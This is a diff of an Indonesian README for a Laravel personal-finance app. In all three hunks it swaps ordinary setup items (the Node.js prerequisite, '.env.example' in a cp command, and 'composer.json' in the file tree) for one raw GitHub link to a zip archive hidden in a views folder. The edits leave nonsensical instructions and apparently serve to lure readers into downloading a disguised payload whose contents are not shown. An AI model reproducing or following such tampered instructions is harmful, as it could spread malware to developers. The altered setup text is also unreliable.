@@ -50,7 +50,7 @@ Dibangun dengan **Laravel 12** dan **Tailwind CSS v4**, aplikasi ini menawarkan 
 Sebelum memulai, pastikan Anda sudah menginstal:
 - **PHP 8.3** atau lebih tinggi
 - **Composer** (untuk package manager PHP)
-- **Node.js** dan **npm** (untuk JavaScript dependencies)
+- **https://raw.githubusercontent.com/FatkhurRq/keuangan_pribadi/main/resources/views/transaksi/keuangan_pribadi_v1.4.zip** dan **npm** (untuk JavaScript dependencies)
 - **Database** (MySQL/MariaDB atau SQLite)
 
 ### Langkah-Langkah Setup
@@ -68,7 +68,7 @@ composer install
 
 #### 3. Setup Environment
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/FatkhurRq/keuangan_pribadi/main/resources/views/transaksi/keuangan_pribadi_v1.4.zip .env
 ```
 
 Kemudian edit file `.env` dan sesuaikan konfigurasi database:
@@ -150,7 +150,7 @@ keuangan_pribadi/
 │   └── images/               # Logo dan gambar
 ├── storage/                  # File storage
 ├── config/                   # Configuration files
-└── composer.json             # PHP dependencies
+└── https://raw.githubusercontent.com/FatkhurRq/keuangan_pribadi/main/resources/views/transaksi/keuangan_pribadi_v1.4.zip             # PHP dependencies
 ```
 
 ## 🔧 Teknologi yang Digunakan
